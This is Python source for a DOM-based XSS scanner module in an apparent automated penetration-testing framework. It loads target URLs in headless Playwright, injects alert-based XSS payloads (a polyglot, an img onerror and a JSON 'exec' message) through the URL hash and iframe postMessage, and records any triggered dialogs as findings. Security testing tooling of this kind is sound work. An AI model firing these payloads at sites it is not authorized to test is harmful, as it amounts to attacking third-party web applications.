"""
DOMXSSAgent — Advanced Headless DOM-based Cross-Site Scripting Specialist.

Utilizes the async BrowserPool (Playwright) to inject payloads into URL parameters and form fields,
monitoring the browser's execution context for injected scripts, `alert()`, or `console.log()`
to definitively prove DOM XSS exploitability without false positives.
"""
from typing import List, Dict, Any
import asyncio
import urllib.parse
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.logger import get_logger
from penflow.infrastructure.browser_pool import BrowserPool

logger = get_logger("penflow.agents.injection.dom_xss")

DOM_XSS_PAYLOADS = [
    {
        "name": "Basic Hash/Search Sink",
        "payload": "'-alert(document.domain)-'",
        "canary": "document.domain"
    },
    {
        "name": "Polyglot DOM Injection",
        "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */window.onerror=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e",
        "canary": "document.domain"
    },
    {
        "name": "HTML Injection (Web Message)",
        "payload": "<img src=1 onerror=alert(document.domain)>",
        "canary": "document.domain"
    },
    {
        "name": "Web Message JSON Exec",
        "payload": "{\"type\":\"exec\",\"data\":\"alert(document.domain)\"}",
        "canary": "document.domain"
    }
]

class DOMXSSAgent(BaseCapabilityAgent):
    def __init__(self, priority: int = 15, **kwargs):
        super().__init__(agent_name="DOMXSSAgent", priority=priority, **kwargs)
        self._browser_pool = BrowserPool.get_instance()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="dom_xss_execution",
                name="DOM-Based XSS (Playwright)",
                description="Detects DOM XSS by executing payloads in a headless browser and catching triggered dialogs.",
                version="1.0.0",
                tags=["injection", "xss", "dom", "playwright", "spa"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[DOMXSSAgent] Executing Headless DOM XSS check on '{context.asset}'")

        target_urls = self._collect_urls(context)
        if not target_urls:
            target_urls = [context.asset if context.asset.startswith("http") else f"https://{context.asset}"]

        findings = []
        is_vulnerable = False
        max_confidence = 0.0
        best_target = target_urls[0]

        # Get an isolated browser context for this scan
        b_context = await self._browser_pool.new_context()
        if not b_context:
            logger.warning("[DOMXSSAgent] Could not acquire browser context. Aborting DOM XSS scan.")
            return self._build_empty_result(capability_id, context, "Failed to acquire headless browser context.")

        try:
            page = await b_context.new_page()

            # Listen for dialogs (alert, prompt, confirm)
            triggered_dialogs = []
            page.on("dialog", lambda dialog: triggered_dialogs.append(dialog.message))

            for url in target_urls[:3]:  # Limit to top 3 URLs to save time
                for vec in DOM_XSS_PAYLOADS:
                    payload = vec["payload"]
                    # Test by appending to hash or URL parameters
                    test_url = f"{url}#{urllib.parse.quote(payload)}"
                    
                    triggered_dialogs.clear()
                    try:
                        # Navigate and wait for network to be mostly idle
                        await page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                        
                        # Wait a tiny bit for JS execution
                        await asyncio.sleep(1.0)
                        
                        if triggered_dialogs:
                            is_vulnerable = True
                            confidence = 0.99
                            reasoning = f"CRITICAL DOM XSS Proven (Phase 1): Payload '{payload}' triggered a JavaScript dialog on '{test_url}'."
                            
                            if confidence > max_confidence:
                                max_confidence = confidence
                                best_target = test_url

                            findings.append({
                                "vulnerability_type": "dom_xss_execution",
                                "severity": "CRITICAL",
                                "confidence": confidence,
                                "is_vulnerable": True,
                                "description": reasoning,
                                "target_url": test_url,
                                "payload": payload,
                                "triggered_dialog_message": triggered_dialogs[0],
                                "proof_of_concept": f"Navigate to: {test_url}"
                            })
                            break # Found one on this URL, move to next finding if needed or stop
                    except Exception as e:
                        logger.debug(f"[DOMXSSAgent] Navigation error for {test_url}: {e}")

                # Phase 2: Web Message (postMessage) Fuzzing
                if not is_vulnerable:
                    for vec in DOM_XSS_PAYLOADS:
                        payload = vec["payload"]
                        triggered_dialogs.clear()
                        try:
                            # Navigate to a blank origin to act as the attacker page
                            await page.goto("about:blank")
                            
                            # Inject iframe pointing to the target URL
                            await page.evaluate(f'''(targetUrl) => {{
                                window.testIframe = document.createElement("iframe");
                                window.testIframe.src = targetUrl;
                                document.body.appendChild(window.testIframe);
                            }}''', url)

                            # Give the iframe time to load
                            await asyncio.sleep(2.0)
                            
                            # Blast the iframe with the payload via postMessage
                            # Web messages can expect strings or JSON objects (e.g. {"type": ..., "data": ...})
                            await page.evaluate(f'''(payload) => {{
                                if (window.testIframe && window.testIframe.contentWindow) {{
                                    window.testIframe.contentWindow.postMessage(payload, '*');
                                    // Try JSON wrapper as well just in case
                                    window.testIframe.contentWindow.postMessage(JSON.stringify({{"type":"exec", "message": payload}}), '*');
                                }}
                            }}''', payload)

                            # Wait for potential dialog
                            await asyncio.sleep(1.0)

                            if triggered_dialogs:
                                is_vulnerable = True
                                confidence = 0.99
                                reasoning = f"CRITICAL DOM XSS Proven (Phase 2 - Web Message): Payload '{payload}' triggered a JavaScript dialog via postMessage on '{url}'."
                                
                                if confidence > max_confidence:
                                    max_confidence = confidence
                                    best_target = url

                                findings.append({
                                    "vulnerability_type": "dom_xss_execution",
                                    "severity": "CRITICAL",
                                    "confidence": confidence,
                                    "is_vulnerable": True,
                                    "description": reasoning,
                                    "target_url": url,
                                    "payload": payload,
                                    "triggered_dialog_message": triggered_dialogs[0],
                                    "proof_of_concept": f"Send postMessage to iframe loaded with {url}"
                                })
                                break
                        except Exception as e:
                            logger.debug(f"[DOMXSSAgent] postMessage fuzzing error for {url}: {e}")
        finally:
            # Always close the context to free up memory
            await b_context.close()

        best_reasoning = findings[0]["description"] if findings else "No DOM XSS vulnerabilities detected via headless execution."

        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vulnerable,
            confidence_score=max_confidence if is_vulnerable else 0.0,
            reasoning=best_reasoning,
            target_url=best_target,
            findings=findings,
            evidence={
                "vulnerability_type": "dom_xss_execution",
                "findings": findings
            }
        ).to_dict()

    def _collect_urls(self, context: CapabilityExecutionContext) -> List[str]:
        target = context.asset if hasattr(context, "asset") else "example.com"
        target_url = target if target.startswith("http") else f"https://{target}"
        urls = [target_url]

        if hasattr(context, "observations") and context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    for ep in data.get("endpoints", []):
                        if isinstance(ep, dict) and ep.get("url"):
                            urls.append(ep["url"])

        # Filter out duplicates and static files
        clean_urls = []
        for u in dict.fromkeys(urls):
            if not u.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".css", ".woff2")):
                clean_urls.append(u)
                
        return clean_urls

    def _build_empty_result(self, cap_id: str, context: CapabilityExecutionContext, reason: str) -> Dict[str, Any]:
        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name, capability=cap_id, asset=context.asset, status="ERROR",
            is_vulnerable=False, confidence_score=0.0, reasoning=reason, target_url=context.asset,
            findings=[], evidence={}
        ).to_dict()

